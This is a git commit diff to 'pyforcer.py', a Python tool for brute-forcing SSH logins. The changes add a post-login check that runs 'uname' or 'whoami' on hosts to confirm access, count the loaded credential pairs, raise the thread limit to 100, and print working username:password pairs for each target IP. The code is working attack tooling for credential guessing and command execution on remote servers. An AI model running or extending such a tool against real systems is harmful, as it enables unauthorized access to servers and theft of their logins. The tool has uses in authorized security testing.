4f902cf33bce2338a8c3eb904efeca9d31b9698b
darkness <73371463+tcphdr@users.noreply.github.com>
2023-11-10 09:00:03 -0600

    Sanity checks

--- pyforcer.py
+++ pyforcer.py
@@ -22,13 +22,15 @@ def is_valid_ipv4(ip):
 
 def read_credentials_file(credentials_file):
     credentials = []
+    counter = 0  # Counter for tracking the number of combinations
     with open(credentials_file, "r") as file:
         for line in file:
             line = line.strip()
             if ":" in line:
                 username, password = line.split(":", 1)
                 credentials.append((username, password))
-    return credentials
+                counter += 1  # Increment the counter for each combination
+    return credentials, counter
 
 def get_private_key(key_file):
     try:
@@ -46,6 +48,25 @@ def get_private_key(key_file):
                 print(f"File \"{key_file}\" is an invalid private key type, exiting.")
                 sys.exit()
 
+def check_success_condition(ssh_client, cmd):
+    try:
+        stdin, stdout, stderr = ssh_client.exec_command(cmd)
+        response = stdout.read().decode("utf-8").strip()
+        success = False
+        if "uname" in cmd:
+            if any(platform in response for platform in ["Linux", "Darwin"]):
+                success = True
+        elif "whoami" in cmd:
+            username = ssh_client.get_transport().get_username()
+            if username in response:
+                success = True
+        else:
+            success = False
+        return success, response
+    except Exception as e:
+        print(f"ERROR: could not run command on {ssh_client.get_transport().getpeername()[0]}: {e}")
+        return False
+    
 def test_ssh_credentials(ip, port, credentials, key_file, output, cmd, private_key, debug):
     successful_logins = []
     for username, password in credentials:
@@ -55,7 +76,6 @@ def test_ssh_credentials(ip, port, credentials, key_file, output, cmd, private_k
             auth_method = None
 
             if key_file:
-                #private_key = get_private_key(key_file)
                 if private_key:
                     try:
                         ssh_client.connect(ip, port=port, username=username, pkey=private_key, timeout=timeout)
@@ -71,19 +91,16 @@ def test_ssh_credentials(ip, port, credentials, key_file, output, cmd, private_k
                     auth_method = "password"
                 except paramiko.AuthenticationException:
                     pass  # Authentication with password failed
-            
-            # Successful login, lets do our business.
+
             if auth_method:
-                stdin, stdout, stderr = ssh_client.exec_command(cmd)
-                uname_output = stdout.read().decode("utf-8").strip()
-                ssh_client.close()
-                if auth_method == "password":
-                    result = f"[PASSWORD] {ip}:{port} {username}:{password} - [CMD:{uname_output}]"
-                    print(f"{result}")
-                elif auth_method == "key":
-                    result = f"[KEY] {ip}:{port} {username}:{key_file} - [CMD:{uname_output}]"
-                    print(f"{result}")
-                
+                # Successful login, let's change the condition to determine success
+                success, response = check_success_condition(ssh_client, cmd)
+                if success:
+                    result = f"[VALID] {auth_method.upper()} {ip}:{port} - {username}:{password} - [CMD:{cmd}] [RESPONSE:{response}]"
+                else:
+                    result = f"[UNKNOWN] {auth_method.upper()} - {ip}:{port} - {username}:{password} - [CMD:{cmd}] [RESPONSE:{response}]"
+            
+                print(result)
                 successful_logins.append(result)
 
         except ConnectionResetError as e:
@@ -121,8 +138,8 @@ def main():
     parser.add_argument("output", help="Path to the output file")
     parser.add_argument("--port", type=int, default=22, help="Port number (default: 22)")
     parser.add_argument("--creds", help="Path to a file containing username and password combinations")
-    parser.add_argument("--keyfile", help="Path to a private key file for authentication (optional)")
-    parser.add_argument("--threads", type=int, default=1, choices=range(1, 51), help="Number of threads to run concurrently (50 max)")
+    parser.add_argument("--keyfile", help="Path to a private key file for authentication (Accepts RSA/DSA/ECDSA)")
+    parser.add_argument("--threads", type=int, default=10, choices=range(1, 101), help="Number of threads to run concurrently (10 default/100 max)")
     parser.add_argument("--cmd", default="uname -a", help="Command to run after successful login (default: uname -a)")
     parser.add_argument("--debug", default=False, action="store_true", help="Enable the script's debugging features.")
     # Parse the arguments
@@ -148,7 +165,7 @@ def main():
             sys.exit("Invalid input: specified keyfile does not exist!")
     if args.creds:
         if os.path.isfile(args.creds):
-            credentials = read_credentials_file(args.creds)
+            credentials, count = read_credentials_file(args.creds)
         else:
             print("ERROR: specified credentials file does not exist.")
             return
@@ -158,17 +175,21 @@ def main():
     if args.keyfile:
         private_key_type, private_key = get_private_key(args.keyfile)
 
+    if not any(match in args.cmd for match in ["uname", "whoami"]):
+        print(f"\n\n[WARN]: specified command has no extra verification, false positives are likely.\n\n")
+
     print("PyForcer - SSH bruteforcing done properly.")
     print("\n")    
     print(f"Target(s): {args.input}")
     print(f"Target Port: {args.port}")
-    print(f"Credentials File: {args.creds}")
+    print(f"Loaded {count} credentials from file: {args.creds}")
     if args.keyfile:
         print(f"{private_key_type} Private Key: {args.keyfile} ✅")
     print(f"Output File: {args.output}")
     print(f"Command To Run: {args.cmd}")
     print(f"Concurrent Threads: {args.threads}")
     print("\n")
+
     with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
         futures = []
         for ip in ip_addresses:
